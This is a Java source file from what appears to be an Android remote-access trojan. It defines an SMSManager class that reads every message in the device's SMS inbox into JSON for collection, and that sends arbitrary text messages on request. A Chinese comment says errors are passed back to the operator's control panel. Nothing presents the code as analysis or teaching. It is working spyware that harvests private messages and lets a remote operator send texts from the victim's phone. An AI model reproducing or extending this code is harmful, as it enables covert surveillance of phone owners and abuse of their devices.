package com.piupiupiu;

import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by piupiupiu on 11/10/16.
 */

public class SMSManager {

    public static JSONObject getSMSList(){

        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();


            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = CoreService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                sms.put("phoneNo" , address);
                sms.put("msg" , body);
                list.put(sms);

            }
            SMSList.put("smsList", list);
            Log.e("done" ,"collecting");
            return SMSList;
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }

    /**
     * 发送短信。失败不再静默返回 false —— 异常直接抛给 Dispatcher，
     * 由失败回传通道把具体原因（如 SecurityException: ... SEND_SMS）发回面板。
     */
    public static boolean relayMessage(String phoneNo, String msg) throws Exception {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNo, null, msg, null, null);
        return true;
    }


}
